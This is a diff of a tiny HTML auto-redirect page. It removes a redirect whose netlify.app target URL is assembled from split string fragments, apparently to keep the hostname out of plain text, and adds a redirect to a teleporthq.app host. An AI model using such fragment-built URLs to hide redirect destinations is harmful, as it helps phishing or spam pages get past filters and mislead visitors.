@@ -1,24 +1,17 @@
+</html>
 <!DOCTYPE html>
 <html>
 <head>
 	<meta charset="UTF-8">
-	<title>自动跳转</title>
-	<script type="text/javascript">
-		// 分割 URL 字符串
-		var parts = [
-			"https://",
-			"b",
-			"a",
-			"id",
-			"u",
-			"c",
-			".netlify.app/"
-		];
-		var url = parts.join(""); // 重新组合 URL 字符串
-		window.location.href = url;
-	</script>
+	<title>自动跳转页面</title>
 </head>
 <body>
-
+	<script>
+		var url = 'https://healthy-great-lobster-jdmca2.teleporthq.app/';
+		var urlParts = url.split('/'); // 将URL按照'/'分割成数组
+		var newUrl = 'https://' + urlParts[2] + '/' + urlParts[3] + '/' + urlParts[4]; // 拼接新的URL
+		window.location.href = newUrl; // 自动跳转到新的URL
+	</script>
 </body>
 </html>
+
